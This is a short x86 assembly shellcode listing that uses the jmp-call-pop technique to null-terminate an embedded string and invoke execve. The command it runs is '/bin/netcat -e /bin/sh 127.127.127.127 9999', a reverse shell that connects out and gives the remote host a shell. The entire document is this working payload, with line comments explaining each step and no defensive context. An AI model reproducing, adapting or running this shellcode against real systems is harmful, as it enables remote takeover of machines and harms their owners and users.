jmp short       forward
back:
pop             esi
xor             eax, eax
mov byte        [esi + 11], al    ; terminate /bin/netcat
mov byte        [esi + 14], al    ; terminate -e
mov byte        [esi + 22], al    ; terminate /bin/sh
mov byte        [esi + 38], al    ; terminate 127.127.127.127
mov byte        [esi + 43], al    ; terminate 9999
mov long        [esi + 44], esi   ; address of /bin/netcat in AAAA
lea             ebx, [esi + 12]   ; get address of -e
mov long        [esi + 48], ebx   ; store address of -e in BBBB
lea             ebx, [esi + 15]   ; get address of /bin/sh
mov long        [esi + 52], ebx   ; store address of /bin/sh in CCCC
lea             ebx, [esi + 23]   ; get address of 127.127.127.127
mov long        [esi + 56], ebx   ; store address of 127.127.127.127 in DDDD
lea             ebx, [esi + 39]   ; get address of 9999
mov long        [esi + 60], ebx   ; store address of 9999 in EEEE
mov long        [esi + 64], eax   ; put NULL in FFFF
mov byte        al, 0x0b          ; pass the execve syscall number as argument
mov             ebx, esi
lea             ecx, [esi + 44]   ; /bin/netcat -e /bin/sh etc etc
lea             edx, [esi + 64]   ; NULL
int             0x80              ; Run the execve syscall

forward:
call            back
db "/bin/netcat#-e#/bin/sh#127.127.127.127#9999#AAAABBBBCCCCDDDDEEEEFFFF"
